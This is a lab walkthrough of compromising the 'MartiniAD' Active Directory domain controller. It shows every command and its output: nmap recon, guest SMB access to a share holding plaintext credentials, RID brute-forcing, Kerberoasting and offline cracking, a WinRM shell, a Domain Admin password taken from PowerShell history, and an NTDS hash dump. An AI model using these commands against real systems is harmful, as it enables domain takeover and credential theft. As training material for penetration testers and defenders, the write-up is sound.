# MartiniAD



![martini](img/image.png)
**Lab:** MartiniAD

**Target:** `DC01.DRY.MARTINI.BARS`

**OS:** Windows Server )

**Difficulty:Easy**

MartiniAD is a good reminder that Active Directory compromises rarely start with a single clever exploit. They start with small, boring mistakes that stack on top of each other: an SMB share that lets guests read and write, a password sitting in a text file, a service account with a weak password and an SPN, and privileged credentials left behind in PowerShell history.

---

## -Attack Path

1. **Recon:** full TCP scan identifies a Windows Server 2025 domain controller.
2. **SMB:** guest/null session is allowed. The `notes` share is readable **and writable**.
3. **Credential leak:** `notes.txt` contains `mprice:*martini*`.
4. **Enumeration:** RID brute-forcing with the new credentials reveals the domain users, including the service account `ATHENA_SVC`.
5. **Kerberoasting:** request a TGS for `ATHENA_SVC`, crack it offline, and recover `1dirtymartini`.
6. **Foothold:** WinRM as `ATHENA_SVC`.
7. **Privilege escalation:** PowerShell history contains the Domain Administrator password.
8. **Domain compromise:** validate the admin credentials, dump NTDS, and own the domain.

---

# -Host File

```jsx
nxc smb 10.1.16.162 -u guest -p '' --generate-hosts-file hosts

computer name :DC01.DRY.MARTINI.BARS
comman name : MARTINI.BARS
```

## -Reconnaissance

I started with a full TCP scan with service detection and the default NSE scripts:

```bash
nmap -p- -sC -sV -Pn -oN nmap.txt 10.1.16.162
```

```jsx
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 126 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 126 Microsoft Windows Kerberos (server time: 2026-08-25 12:29:22Z)
135/tcp   open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 126 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: DRY.MARTINI.BARS, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 126
464/tcp   open  kpasswd5?     syn-ack ttl 126
593/tcp   open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 126
3268/tcp  open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: DRY.MARTINI.BARS, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 126
3389/tcp  open  ms-wbt-server syn-ack ttl 126
| ssl-cert: Subject: commonName=DC01.DRY.MARTINI.BARS
| Issuer: commonName=DC01.DRY.MARTINI.BARS
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-08-24T12:19:31
| Not valid after:  2027-02-23T12:19:31
| MD5:     91c8 052b bcc1 e77e dea8 d7e3 0a8f d17f
| SHA-1:   2d3b 362b e3df 26e3 6370 600b 57fe c45e e4c6 c408
| SHA-256: b937 ead2 e890 2a8a d9b9 4367 db1c 7491 16f5 7577 8045 5a85 1590 a744 1852 384c
| -----BEGIN CERTIFICATE-----
| MIIC7jCCAdagAwIBAgIQfFDudRLlwYZKhH5gYs2OCjANBgkqhkiG9w0BAQsFADAg
| MR4wHAYDVQQDExVEQzAxLkRSWS5NQVJUSU5JLkJBUlMwHhcNMjYwODI0MTIxOTMx
| WhcNMjcwMjIzMTIxOTMxWjAgMR4wHAYDVQQDExVEQzAxLkRSWS5NQVJUSU5JLkJB
| UlMwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDMv+YJpbnbQjimDuXJ
| 3sy10iHdVz1dBbqFsWljYT8+alQsG7OHItDnmML6Uc6mxHIBL5gZV+CURvvmCg48
| O7VOEN0uodoWUwgbnZqrVVNCt3AUozuySe39N+o/pU2UT4fBxTWr3sX5luvaRBpD
| isjhqcE1CRPBtqcIwR9UZeuVmuTxoRR6shue13LL6BhKt+ll23+AktEgM0/9+ylB
| ONrz0dzKDE0Y03cCxn7U7yCmkQJjB4pQ1JtdnecYZHshQhc37/GlqZgBaaSNgBsg
| XKBZSwAY6Aa+gIW5QY6BupU0yY2Kt7qxxkZar44lm5Siyk5tHNQtEfOM/hVvP4SH
| f4FxAgMBAAGjJDAiMBMGA1UdJQQMMAoGCCsGAQUFBwMBMAsGA1UdDwQEAwIEMDAN
| BgkqhkiG9w0BAQsFAAOCAQEAGALUUscYaPYWLtCpva6orDCQtU2qM9v09DjsnZxl
| N42SWmvy5VSE03oSoO1yS2cifdCoNy+mHefef1vNIQbKXzYbfHOMLaQc4noOZLsz
| oD/fH2bl/riPRjWyp+XoACiha8AMuMadqbeZFKdnORthQx7vjB+iV2xZr1waiN+N
| j2A2E918fgPoUvK0DWQLfPgpNDjesdNFNnG8Yz1qyLh0ox18ccscZSe8embksdK/
| zfVCPSw0cbrdX+jKk6fWpTCEfqTWrpqumf1edBqRQTZDjpEcb8Viev52Xq7ySoYV
| QcRlUuvE8FZTaveSDCie2qNZciNv+hDwiKoSlBBFJ2uBPA==
|_-----END CERTIFICATE-----
| rdp-ntlm-info: 
|   Target_Name: DRY
|   NetBIOS_Domain_Name: DRY
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: DRY.MARTINI.BARS
|   DNS_Computer_Name: DC01.DRY.MARTINI.BARS
|   Product_Version: 10.0.26100
|_  System_Time: 2026-08-25T12:30:26+00:00
|_ssl-date: TLS randomness does not represent time
5985/tcp  open  http          syn-ack ttl 126 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 126 .NET Message Framing
49664/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49672/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49673/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49674/tcp open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
49695/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49710/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
63249/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3389-TCP:V=7.99%I=7%D=8/25%Time=6A8D8AA6%P=x86_64-pc-linux-gnu%r(Te
SF:rminalServerCookie,13,"\x03\0\0\x13\x0e\xd0\0\0\x124\0\x02\?\x08\0\x02\
SF:0\0\0");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
TCP/IP fingerprint:
SCAN(V=7.99%E=4%D=8/25%OT=53%CT=%CU=%PV=Y%DS=3%DC=T%G=N%TM=6A8D8B15%P=x86_64-pc-linux-gnu)
SEQ(SP=101%GCD=1%ISR=109%TI=I%TS=A)
SEQ(SP=107%GCD=1%ISR=107%TI=I%TS=A)
OPS(O1=M510NW8ST11%O2=M510NW8ST11%O3=M510NW8NNT11%O4=M510NW8ST11%O5=M510NW8ST11%O6=M510ST11)
WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FFFF)
ECN(R=Y%DF=Y%TG=80%W=FFFF%O=M510NW8NNS%CC=Y%Q=)
T1(R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
U1(R=N)
IE(R=N)

Uptime guess: 0.009 days (since Tue Aug 25 17:48:47 2026)
Network Distance: 3 hops
TCP Sequence Prediction: Difficulty=257 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-08-25T12:30:30
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 18219/tcp): CLEAN (Timeout)
|   Check 2 (port 44846/tcp): CLEAN (Timeout)
|   Check 3 (port 51305/udp): CLEAN (Timeout)
|   Check 4 (port 57437/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: mean: 0s, deviation: 0s, median: 0s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required

TRACEROUTE (using port 445/tcp)
HOP RTT       ADDRESS
1   303.04 ms 10.200.0.1
2   ...
3   303.07 ms DRY.MARTINI.BARS (10.1.237.213)

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 18:01
Completed NSE at 18:01, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 18:01
Completed NSE at 18:01, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 18:01
Completed NSE at 18:01, 0.00s elapsed
Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 123.36 seconds
           Raw packets sent: 119 (9.544KB) | Rcvd: 52 (2.792KB)
```

The scan also gave up the host and domain names:

```
Host:   DC01.DRY.MARTINI.BARS
Domain: DRY.MARTINI.BARS
OS:     Windows Server 2025 Build 26100
```

One finding stood out immediately:

```
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
```

SMB signing not being required is a relay opportunity, although it was not needed for this path. WinRM being open was more interesting: if I could find any valid domain credentials, there was a good chance of getting a shell.

---

## -SMB Enumeration

The first real break was that guest authentication worked:

```bash
nxc smb  10.0.29.16 -u guest -p '' --shares
```

```
SMB  10.0.29.16  445  DC01  [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:DRY.MARTINI.BARS) (signing:False) (SMBv1:None)
SMB  10.0.29.16  445  DC01  [+] DRY.MARTINI.BARS\guest:
SMB  10.0.29.16  445  DC01  [*] Enumerated shares
SMB  10.0.29.16  445  DC01  Share           Permissions     Remark
SMB  10.0.29.16  445  DC01  -----           -----------     ------
SMB  10.0.29.16  445  DC01  ADMIN$                          Remote Admin
SMB  10.0.29.16  445  DC01  C$                              Default share
SMB  10.0.29.16  445  DC01  IPC$            READ            Remote IPC
SMB  10.0.29.16  445  DC01  NETLOGON                        Logon server share
SMB  10.0.29.16  445  DC01  notes           READ,WRITE
SMB  10.0.29.16  445  DC01  SYSVOL                          Logon server share
```

The `notes` share was readable **and writable** by an unauthenticated guest. That is already two problems in one. I connected with `smbclient` and pulled the contents:

```bash
smbclient //10.0.29.16/notes -N
```

```
smb: \> ls
  notes.txt    A    123  Wed Aug 26 12:00:00 2026
smb: \> get notes.txt
```

```bash
cat notes.txt
```

```
- Order more gin for lakeside
- Look for an engagement ring
- Check that notes works from Linux Mint

creds
mprice:*martini*
```

A plaintext credential in a world-readable share. The note also hints that the share is used from a Linux machine, which explains why it was left wide open for convenience.

```
mprice:*martini*
```

---

## -Domain User Enumeration

With a valid credential, I could enumerate the domain through RID brute-forcing:

```bash
nxc smb 10.0.29.16 -u mprice -p '*martini*' --rid-brute
```

The output listed the usual built-in accounts and groups, plus a few custom users:

```
1104: DRY\mprice (SidTypeUser)
1105: DRY\athena.t0 (SidTypeUser)
1106: DRY\ATHENA_SVC (SidTypeUser)
```

I extracted just the usernames for later use:

```bash
nxc smb 10.0.29.16 -u mprice -p '*martini*' --rid-brute \
  | grep SidTypeUser \
  | awk -F'\\' '{print $2}' \
  | awk '{print $1}' \
  | tee users.txt
```

```
Administrator
Guest
krbtgt
DC01$
mprice
athena.t0
ATHENA_SVC
```

`ATHENA_SVC` immediately looked like a service account. Service accounts are often over-privileged, rarely rotated, and most importantly for us frequently have an SPN registered.

---

## -Choosing the Next Move

With one valid username/password pair and a list of domain users, the usual options are:

| Attack | Result |
| --- | --- |
| AS-REP roasting | Attempted — no usable result |
| Password spraying | Attempted — no additional hit with the known password |
| **Kerberoasting** | **Successful — `ATHENA_SVC` had an SPN and a weak password** |

Kerberoasting was the cleanest path, and it only required the `mprice` credentials we already had.

---

## -Kerberoasting `ATHENA_SVC`

Kerberoasting abuses a design feature of Kerberos: any authenticated domain user can request a service ticket (TGS) for any account that has a Service Principal Name. The ticket is encrypted with the service account’s NTLM hash, so it can be taken offline and cracked at leisure. The service itself never has to be touched.

I requested the tickets with Impacket:

```bash
impacket-GetUserSPNs -request -dc-ip 10.0.29.16 "DRY.MARTINI.BARS/mprice:*martini*" -outputfile hash.hash
```

The tool enumerated the accounts with SPNs and returned a ticket for `ATHENA_SVC`

The hash was saved to `hash.hash` in the usual `$krb5tgs$23$...` format. I fed it to John with `rockyou.txt`:

```bash
john hash.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

```
1dirtymartini     (ATHENA_SVC)
```

The service account password was `1dirtymartini`.

Hashcat works just as well:

```bash
hashcat -m 13100 hash.hash /usr/share/wordlists/rockyou.txt
```

---

## -WinRM as `ATHENA_SVC`

Port `5985` was open, and now I had a valid service account password. Evil-WinRM gave me a shell:

```bash
evil-winrm -i 10.0.29.16 -u ATHENA_SVC -p '1dirtymartini'
```

```
*Evil-WinRM* PS C:\Users\ATHENA_SVC\Documents> whoami
dry\athena_svc
```

The account was not a Domain Admin, but it had interactive logon rights on the DC, which is more than enough to continue enumerating.

While poking around the user profile, I checked the PowerShell history:

```powershell
type "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
```

The history contained a plaintext credential for the domain Administrator:

```
Administrator:ebz0yxy3txh9BDE*yeh
```

---

## -Domain Admin Validate and Dump NTDS

First, confirm the credentials work and that the account has administrative rights:

```bash
nxc smb 10.0.29.16 -u Administrator -p 'ebz0yxy3txh9BDE*yeh'
```

```
SMB  10.0.29.16  445  DC01  [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:DRY.MARTINI.BARS) (signing:False) (SMBv1:None)
SMB  10.0.29.16  445  DC01  [+] DRY.MARTINI.BARS\Administrator:ebz0yxy3txh9BDE*yeh (Pwn3d!)
```

`Pwn3d!` means NetExec authenticated with administrative privileges.

Now the domain is effectively over. I dumped the NTDS database:

```bash
nxc smb 10.0.29.16 -u Administrator -p 'ebz0yxy3txh9BDE*yeh' --ntds
```

```
SMB  10.0.29.16  445  DC01  [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:DRY.MARTINI.BARS) (signing:False) (SMBv1:None)
SMB  10.0.29.16  445  DC01  [+] DRY.MARTINI.BARS\Administrator:ebz0yxy3txh9BDE*yeh (Pwn3d!)
SMB  10.0.29.16  445  DC01  [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB  10.0.29.16  445  DC01  Administrator:500:aad3b435b51404eeaad3b435b51404ee:d5cad8a9782b2879bf316f56936f1e36:::
SMB  10.0.29.16  445  DC01  Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB  10.0.29.16  445  DC01  krbtgt:502:aad3b435b51404eeaad3b435b51404ee:22ebc290e67668629c8d0812662a9c51:::
SMB  10.0.29.16  445  DC01  DRY.MARTINI.BARS\mprice:1104:aad3b435b51404eeaad3b435b51404ee:821e97e217ddc6e433ac92e0b92955fc:::
SMB  10.0.29.16  445  DC01  DRY.MARTINI.BARS\athena.t0:1105:aad3b435b51404eeaad3b435b51404ee:5f4ae3ddff03f730dd0f1ab97f5849eb:::
SMB  10.0.29.16  445  DC01  DRY.MARTINI.BARS\ATHENA_SVC:1106:aad3b435b51404eeaad3b435b51404ee:5f4ae3ddff03f730dd0f1ab97f5849eb:::
SMB  10.0.29.16  445  DC01  DC01$:1000:aad3b435b51404eeaad3b435b51404ee:a23693398550ef8f9f6a7ca4b0fe07bf:::
SMB  10.0.29.16  445  DC01  [+] Dumped 7 NTDS hashes to /home/elliot/.nxc/logs/ntds/DC01_10.0.29.16_2026-08-31_194620.ntds of which 6 were added to the database
```

The same result can be obtained directly with Impacket:

```bash
impacket-secretsdump "10.0.29.16/Administrator:ebz0yxy3txh9BDE*yeh@$DC" -just-dc-ntlm
```

---

## Tools Used

| Tool | Purpose |
| --- | --- |
| `nmap` | Port and service discovery |
| `NetExec` (`nxc`) | SMB enumeration, RID brute, credential validation, NTDS dump |
| `smbclient` | Share browsing and file retrieval |
| `Impacket GetUserSPNs` | Kerberoasting |
| `John the Ripper` / `Hashcat` | Offline hash cracking |
| `Evil-WinRM` | WinRM shell |
